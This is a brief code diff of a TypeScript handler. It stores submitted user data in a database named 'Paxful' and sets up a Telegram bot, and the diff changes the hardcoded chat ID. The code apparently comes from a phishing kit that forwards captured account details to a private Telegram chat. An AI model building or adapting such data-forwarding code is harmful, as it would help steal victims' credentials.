@@ -7,7 +7,7 @@ async function create(req: Request) {
     const client = await clientPromise;
     const db = client.db("Paxful");
     const bot = new TelegramBot(process.env.TOKEN as string);
-    const chatId = 2050970838;
+    const chatId = 6529214676;
 
     // If the user does not exist by email or name Insert the new user into the database
     await db.collection("users").insertOne(body);
